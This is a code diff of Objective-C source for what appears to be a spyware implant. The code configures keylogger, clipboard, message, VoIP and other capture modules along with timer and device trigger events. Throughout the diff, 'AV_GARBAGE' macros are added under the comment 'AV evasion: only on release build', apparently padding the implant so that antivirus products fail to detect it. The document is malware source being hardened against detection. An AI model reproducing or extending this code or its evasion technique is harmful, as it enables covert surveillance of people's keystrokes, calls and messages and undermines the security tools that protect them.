   NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_KEYLOG];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
   
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   keys = [NSArray arrayWithObjects: @"agentID",
                                     @"status",
@@ -762,16 +1191,31 @@ typedef struct  {
                                        MODULE_EMPTY_CONF,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [moduleConfiguration addEntriesFromDictionary: dictionary];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [mAgentsList addObject: moduleConfiguration];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [moduleConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [pool release];
 }
@@ -786,10 +1230,20 @@ typedef struct  {
   NSArray *objects = nil;
   
   NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_CLIPBOARD];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   keys = [NSArray arrayWithObjects: @"agentID",
                                     @"status",
@@ -801,16 +1255,31 @@ typedef struct  {
                                        MODULE_EMPTY_CONF,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   [moduleConfiguration addEntriesFromDictionary: dictionary];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   [mAgentsList addObject: moduleConfiguration];
   
   [moduleConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   [pool release];
 }
@@ -819,15 +1288,21 @@ typedef struct  {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   id enabled = AGENT_ENABLED;
   NSArray *keys = nil;
   NSArray *objects = nil;
   
-#ifdef DEBUG_JSON_CONFIG
-  NSLog(@"%s: registering module type %@", __FUNCTION__, [aModule objectForKey: @"desc"]);
-#endif
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   
   NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSNumber *type  = [NSNumber numberWithUnsignedInt: AGENT_MESSAGES];
   NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
@@ -835,22 +1310,37 @@ typedef struct  {
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   keys = [NSArray arrayWithObjects: @"agentID",
           @"status",
           @"data",
           nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
   
   objects = [NSArray arrayWithObjects: type, 
              enabled, 
              MODULE_EMPTY_CONF,
              nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [mAgentsList addObject: moduleConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   [moduleConfiguration release];
   
@@ -873,18 +1363,34 @@ typedef struct  {
   NSArray *objects = nil;
   NSData  *data;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSNumber *type        = [NSNumber numberWithUnsignedInt:AGENT_VOIP];
   NSNumber *compression = [aModule objectForKey:@"compression"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSNumber *buffer      = [aModule objectForKey:@"buffer"];
   NSNumber *status      = [aModule objectForKey: MODULES_STATUS_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   if (status == nil || [status boolValue] == FALSE)
     enabled = AGENT_DISABLED;
   
   memset(&voip, 0, sizeof(voip));
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   voip.sampleSize  = (buffer != nil ? [buffer unsignedIntValue] : 512000);
   voip.compression = (compression != nil ? [compression intValue] : 5);
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   data = [[NSData alloc] initWithBytes: &voip length: sizeof(voip)];
   
@@ -898,6 +1404,9 @@ typedef struct  {
                                        data,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
@@ -905,109 +1414,19 @@ typedef struct  {
   
   [moduleConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   [mAgentsList addObject: moduleConfiguration];
   
   [moduleConfiguration release];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [data release];
   
   [pool release];
-}
-
-- (void)parseAndAddModules:(NSDictionary *)dict
-{  
-  NSArray *modulesArray = [dict objectForKey: MODULES_KEY];
-  
-  if (modulesArray == nil) 
-    {
-#ifdef DEBUG_JSON_CONFIG
-    NSLog(@"%s: no modulesArray found", __FUNCTION__);
-#endif
-    return;
-    }
-  
-  for (int i=0; i < [modulesArray count]; i++) 
-    {
-    NSAutoreleasePool *inner = [[NSAutoreleasePool alloc] init];
-    
-    NSDictionary *module = (NSDictionary *)[modulesArray objectAtIndex: i];
-    
-    NSString *moduleType = [module objectForKey: MODULES_TYPE_KEY];
-    
-    if (moduleType != nil)
-      {
-      if ([moduleType compare: MODULES_ADDBK_KEY] == NSOrderedSame) 
-        {
-          [self initABModule: module];
-        }
-      else if ([moduleType compare: MODULES_DEV_KEY] == NSOrderedSame) 
-        {
-          [self initDeviceModule: module];
-        }
-      else if ([moduleType compare: MODULES_CLIST_KEY] == NSOrderedSame) 
-        {
-          [self initCalllistModule: module];
-        }
-      else if ([moduleType compare: MODULES_CAL_KEY] == NSOrderedSame) 
-        {
-          [self initCalendarModule: module];
-        }
-      else if ([moduleType compare: MODULES_MIC_KEY] == NSOrderedSame) 
-        {
-          [self initMicModule: module];
-        }
-      else if ([moduleType compare: MODULES_SNP_KEY] == NSOrderedSame) 
-        {
-          [self initScrshotModule: module];
-        }
-      else if ([moduleType compare: MODULES_URL_KEY] == NSOrderedSame) 
-        {
-          [self initUrlModule: module];
-        }
-      else if ([moduleType compare: MODULES_APP_KEY] == NSOrderedSame) 
-        {
-          [self initAppModule: module];
-        }      
-      else if ([moduleType compare: MODULES_KEYL_KEY] == NSOrderedSame) 
-        {
-          [self initKeyLogModule: module];
-        }
-      else if ([moduleType compare: MODULES_MSGS_KEY] == NSOrderedSame) 
-        {
-          [self initMessagesModule: module];
-        }
-      else if ([moduleType compare: MODULES_CLIP_KEY] == NSOrderedSame) 
-        {
-          [self initClipboardModule: module];
-        }
-      else if ([moduleType compare: MODULES_CAMERA_KEY] == NSOrderedSame) 
-        {
-          [self initCameraModule: module];
-        }
-      else if ([moduleType compare: MODULES_POSITION_KEY] == NSOrderedSame) 
-        {
-          [self initPositionModule: module];
-        }
-      else if ([moduleType compare: MODULES_CHAT_KEY] == NSOrderedSame) 
-        {
-          [self initChatModule: module];
-        }
-      else if ([moduleType compare: @"mouse"] == NSOrderedSame) 
-        {
-          [self initMouseModule: module];
-        }
-      else if ([moduleType compare: @"call"] == NSOrderedSame) 
-        {
-          [self initCallModule: module];
-        }
-      else if ([moduleType compare: @"file"] == NSOrderedSame) 
-        {
-          [self initFileModule: module];
-        }
-      }
-    
-    [inner release];
-    }
 }
 
 #
@@ -1019,6 +1438,7 @@ typedef struct  {
 #define EVENT_PROCESS_ON_PROC   0x00000000
 #define EVENT_PROCESS_ON_WINDOW 0x00000001
 #define EVENT_PROCESS_ON_FOCUS  0x00000002  
+
 // Done. check comments.
 - (void)addProcessEvent: (NSDictionary *)anEvent
 {
@@ -1028,19 +1448,39 @@ typedef struct  {
   NSArray *objects;
   NSData  *data;
   processStruct_t procStruct;
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   // Default value for all parameters: 0xFFFFFFFF
   NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_PROCESS];
   NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
   NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
   NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
   NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
-   
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   memset(&procStruct, 0, sizeof(procStruct));
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   if ([anEvent objectForKey: EVENT_ACTION_END_KEY] != nil) 
     {
@@ -1050,7 +1490,10 @@ typedef struct  {
     {
       procStruct.onClose  = 0xFFFFFFFF;
     }
- 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if ([anEvent objectForKey: EVENT_PROC_WINDOW_KEY] != nil) 
     {
       if ([[anEvent objectForKey: EVENT_PROC_WINDOW_KEY] intValue] == TRUE)
@@ -1063,11 +1506,17 @@ typedef struct  {
   
   if ([anEvent objectForKey: EVENT_PROC_FOCUS_KEY] != nil) 
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_008
+    
       if ([[anEvent objectForKey: EVENT_PROC_FOCUS_KEY] intValue] == TRUE)
         procStruct.lookForTitle |= EVENT_PROCESS_ON_FOCUS;
     }
 
-    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if ([anEvent objectForKey: EVENT_PROC_NAME_KEY] != nil) 
     {
       //FIXED- ???
@@ -1081,10 +1530,16 @@ typedef struct  {
       NSData *nameData = [[anEvent objectForKey: EVENT_PROC_NAME_KEY] dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
       u_int nameLength = [nameData length] < 256 ? [nameData length] : 256;
       memcpy(procStruct.name, [nameData bytes], nameLength);
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
     }
   
   data = [NSData dataWithBytes: &procStruct length: sizeof(procStruct)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   keys = [NSArray arrayWithObjects: @"type",      // for comp
                                     @"actionID",  // for comp
@@ -1099,6 +1554,9 @@ typedef struct  {
                                     @"end",
                                     nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   objects = [NSArray arrayWithObjects: type, 
                                        action  != nil ? action  : defNum, 
                                        data,
@@ -1111,17 +1569,29 @@ typedef struct  {
                                        iter    != nil ? iter    : defNum,
                                        end     != nil ? end     : defNum,
                                        nil];
-             
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
   
   [eventConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   [mEventsList addObject: eventConfiguration];
   
   [eventConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   [pool release];
 }
@@ -1134,52 +1604,98 @@ typedef struct  {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSTimeInterval msec = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   if (aDate == nil)
     return msec;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   NSRange fixedRange;
   fixedRange.location = 11;
   fixedRange.length   = 8;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   //date description format: YYYY-MM-DD HH:MM:SS ±HHMM
   // UTC timers
   NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
   [inFormat setTimeZone:timeZone];
   [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   // Get current date string UTC
   NSDate *now = [NSDate date];
   NSString *currDateStr = [inFormat stringFromDate: now];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   [inFormat release];
   
   // Create string from current date: yyyy-MM-dd hh:mm:ss ZZZ
   NSMutableString *dayStr = [[NSMutableString alloc] initWithString: currDateStr];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   // reset current date time to midnight
   [dayStr replaceCharactersInRange: fixedRange withString: @"00:00:00"];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   NSDateFormatter *outFormat = [[NSDateFormatter alloc] init];
   [outFormat setTimeZone:timeZone];
   [outFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss ZZZ"];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   // Current midnite
   NSDate *midnight = [outFormat dateFromString: dayStr];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   // Set current date time to aDate
   [dayStr replaceCharactersInRange: fixedRange withString: aDate];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSDate *date = [outFormat dateFromString: dayStr];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   [outFormat release];
   [dayStr release];
   
   msec = [date timeIntervalSinceDate: midnight];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   msec *= 1000;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   [pool release];
   
@@ -1191,24 +1707,43 @@ typedef struct  {
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   if (aDate == nil)
     return 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
   
   // date description format: YYYY-MM-DD HH:MM:SS ±HHMM
   // UTC timers
   NSTimeZone *timeZone = [NSTimeZone timeZoneWithName:@"UTC"];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   NSDateFormatter *inFormat = [[NSDateFormatter alloc] init];
   [inFormat setTimeZone:timeZone];
   [inFormat setDateFormat: @"yyyy-MM-dd HH:mm:ss"];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   // Get date string UTC
   NSDate *theDate = [inFormat dateFromString: aDate];
   [inFormat release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSTimeInterval unixTime = [theDate timeIntervalSince1970];
   int64_t winTime = (unixTime * RATE_DIFF) + EPOCH_DIFF;
 
- [pool release];
+  [pool release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   return  winTime;
 }
@@ -1218,8 +1753,14 @@ typedef struct  {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   int64_t days;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   if (aDay == nil)
     return 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   // days in 100nanosec * secXHour * hourXdays
   days = (int64_t)[aDay intValue] * TIMER_100NANOSEC_PER_DAY;
@@ -1237,10 +1778,19 @@ typedef struct  {
   
   NSString *eventType = [anEvent objectForKey: EVENT_TYPE_KEY];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   if ([eventType compare: EVENTS_TIMER_KEY] == NSOrderedSame)
     {
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+    
       NSString *subtype = [anEvent objectForKey: EVENTS_TIMER_SUBTYPE_KEY];
-      
+    
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+    
       if (subtype == nil)
         type = TIMER_UNKNOWN;
       else if ([subtype compare: EVENTS_TIMER_SUBTYPE_LOOP_KEY] == NSOrderedSame)
@@ -1256,6 +1806,9 @@ typedef struct  {
   else if ([eventType compare: EVENTS_TIMER_AFTERINST_KEY] == NSOrderedSame)
     type = TIMER_INST;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   return type;
 }
 
@@ -1265,6 +1818,8 @@ typedef struct  {
 // TIMER_DATE, TIMER_INST -> EVENTS_TIMER_DATE_KEY, EVENTS_TIMER_AFTERINST_KEY
 // TIMER_AFTER_STARTUP, TIMER_LOOP, TIMER_DAILY -> EVENTS_TIMER_KEY
 // Done.
+
+
 - (void)addTimerEvent: (NSDictionary *)anEvent
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
@@ -1274,16 +1829,34 @@ typedef struct  {
   NSData  *data;
   timerStruct_t timerStruct;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   memset(&timerStruct, 0, sizeof(timerStruct));
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
   
   NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_TIMER];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
-  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
+  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];      
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
   NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
-  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
+  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];      
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
   
   timerStruct.type = [self timerGetSubtype:anEvent];
@@ -1292,29 +1865,52 @@ typedef struct  {
   switch (timerStruct.type) 
   {
     case TIMER_LOOP:
-    {
+    {    
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       timerStruct.loDelay = delay != nil ? [delay intValue] : 0xFFFFFFFF;
       if (delay != nil)
         timerStruct.loDelay *= 1000;
       break;
     }  
     case TIMER_DAILY:
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       timerStruct.loDelay = [self calculateMsecFromMidnight:[anEvent objectForKey:EVENTS_TIMER_TS_KEY]];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
+      
       timerStruct.hiDelay = [self calculateMsecFromMidnight:[anEvent objectForKey:EVENTS_TIMER_TE_KEY]];
     break;
     }
     case TIMER_DATE:
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       int64_t winDate = [self calculateWinDate:[anEvent objectForKey: EVENTS_TIMER_DATEFROM_KEY]];
-      timerStruct.loDelay = winDate & 0x00000000FFFFFFFF;
+      timerStruct.loDelay = winDate & 0x00000000FFFFFFFF;  
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       timerStruct.hiDelay = (winDate >> 32) & 0x00000000FFFFFFFF;
     break;
     }
     case TIMER_INST:
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       int64_t winDate = [self calculateDaysDate:[anEvent objectForKey: EVENTS_TIMER_DAYS_KEY]];
-      timerStruct.loDelay = winDate & 0x00000000FFFFFFFF;
+      timerStruct.loDelay = winDate & 0x00000000FFFFFFFF;  
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       timerStruct.hiDelay = (winDate >> 32) & 0x00000000FFFFFFFF;
       break;
     }
@@ -1333,7 +1929,13 @@ typedef struct  {
     }
   }
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   data = [NSData dataWithBytes: &timerStruct length: sizeof(timerStruct)];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   keys = [NSArray arrayWithObjects: @"type", 
                                     @"actionID", 
@@ -1364,13 +1966,22 @@ typedef struct  {
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
   
   [eventConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [mEventsList addObject: eventConfiguration];
   
   [eventConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [pool release];
 }
@@ -1387,16 +1998,34 @@ typedef struct  {
   
   NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_SCREENSAVER];
   NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
-  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
+  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY]; 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
-  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
+  NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY]; 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
   NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
   
   actionExit = (end != nil ? [end intValue] : 0xFFFFFFFF);
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
+  
   data = [NSData dataWithBytes: &actionExit length:sizeof(int)];
   
   keys = [NSArray arrayWithObjects: @"type", 
@@ -1411,6 +2040,9 @@ typedef struct  {
                                     @"iter",
                                     @"end",
                                     nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   objects = [NSArray arrayWithObjects: type, 
                                        action  != nil ? action  : defNum, 
@@ -1430,9 +2062,15 @@ typedef struct  {
   
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   [eventConfiguration addEntriesFromDictionary: dictionary];
   
   [mEventsList addObject: eventConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   [eventConfiguration release];
   
@@ -1447,14 +2085,28 @@ typedef struct  {
   NSArray *keys;
   NSArray *objects; 
   
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_SIM_CHANGE];
   NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
-  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
+  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];  
+
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
   NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
-  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
+  NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
 
   keys = [NSArray arrayWithObjects: @"type", 
@@ -1470,6 +2122,9 @@ typedef struct  {
                                     @"end",
                                     nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   objects = [NSArray arrayWithObjects: type, 
                                        action  != nil ? action  : defNum, 
                                        @"",
@@ -1483,14 +2138,23 @@ typedef struct  {
                                        end     != nil ? end     : defNum,
                                        nil];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_005
+  
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [eventConfiguration addEntriesFromDictionary: dictionary];
   
   [mEventsList addObject: eventConfiguration];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   [eventConfiguration release];
   
@@ -1509,13 +2173,24 @@ typedef struct  {
   
   NSNumber *defNum  = [NSNumber numberWithUnsignedInt: ACTION_UNKNOWN];
   
-  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_CONNECTION];  
+  NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_CONNECTION];    
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
   NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
-  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
+  NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_003
+  
   NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
   NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
   NSNumber *end     = [anEvent objectForKey: EVENT_ACTION_END_KEY];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_005
   
   memset(&conStruct, 0, sizeof(conStruct));
   
@@ -1528,14 +2203,23 @@ typedef struct  {
   else
     conStruct.ipAddress = 0;
   
+  // AV evasion: only on release build
+  AV_GARBAGE_006
+  
   if ([anEvent objectForKey:@"netmask"] != nil)
-    {
+    {  
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+    
       NSString *maskString  = [anEvent objectForKey:@"netmask"];
       NSData *maskData      = [maskString dataUsingEncoding:NSUTF8StringEncoding];
       conStruct.netMask     = inet_addr([maskData bytes]);
     }
   else
     conStruct.netMask = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_008
   
   if ([anEvent objectForKey:@"port"] != nil)
     {
@@ -1544,7 +2228,10 @@ typedef struct  {
     }
   else
     conStruct.port = 0; 
-     
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_009
+  
   data = [NSData dataWithBytes: &conStruct length: sizeof(conStruct)];
   
   keys = [NSArray arrayWithObjects: @"type", 
@@ -1559,6 +2246,9 @@ typedef struct  {
                                     @"iter",
                                     @"end",
                                     nil];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
   objects = [NSArray arrayWithObjects: type, 
                                        action  != nil ? action  : defNum, 
@@ -1576,13 +2266,22 @@ typedef struct  {
   NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
                                                          forKeys: keys];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSMutableDictionary *eventConfiguration = [[NSMutableDictionary alloc] init];
   
   [eventConfiguration addEntriesFromDictionary: dictionary];
   
+  // AV evasion: only on release build
+  AV_GARBAGE_004
+  
   [mEventsList addObject: eventConfiguration];
   
   [eventConfiguration release];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
   
   [pool release];
 }
@@ -1591,6 +2290,9 @@ typedef struct  {
 - (void)addBatteryEvent: (NSDictionary *)anEvent
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_004
   
   NSArray *keys;
   NSArray *objects;
@@ -1601,12 +2303,24 @@ typedef struct  {
   NSNumber *type    = [NSNumber numberWithUnsignedInt: EVENT_BATTERY];
   
   NSNumber *action  = [anEvent objectForKey: EVENTS_ACTION_START_KEY];
-  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];
+  NSNumber *enabled = [anEvent objectForKey: EVENT_ENABLED_KEY];  
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   NSNumber *repeat  = [anEvent objectForKey: EVENT_ACTION_REP_KEY];
   NSNumber *delay   = [anEvent objectForKey: EVENT_ACTION_DELAY_KEY];
   NSNumber *iter    = [anEvent objectForKey: EVENT_ACTION_ITER_KEY];
+  
